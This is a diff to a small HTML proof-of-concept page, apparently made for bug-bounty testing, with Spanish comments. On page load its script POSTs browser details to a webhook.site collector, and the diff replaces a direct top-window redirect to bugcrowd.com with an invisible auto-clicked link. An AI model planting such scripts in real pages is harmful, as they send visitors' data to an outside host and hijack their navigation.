@@ -2,8 +2,7 @@
 <html>
 <body>
 <script>
-  // Primero el fetch
-  fetch("https://webhook.site/959fa6ae-59d6-49fb-b8ba-2d945836e96f", {
+  fetch("https://webhook.site/1a2b7254-7b4f-4cfb-9954-ab6dd6b5935b", {
     method: "POST",
     mode: "no-cors",
     body: JSON.stringify({
@@ -11,9 +10,9 @@
       language: navigator.language
     })
   });
-
-  // Redirect con window.top en vez de top directamente
-  window.top.location.replace("https://www.bugcrowd.com");
 </script>
+<!-- Click invisible que trigerea el redirect -->
+<a href="https://www.bugcrowd.com" id="r" target="_top"></a>
+<script>document.getElementById('r').click();</script>
 </body>
 </html>
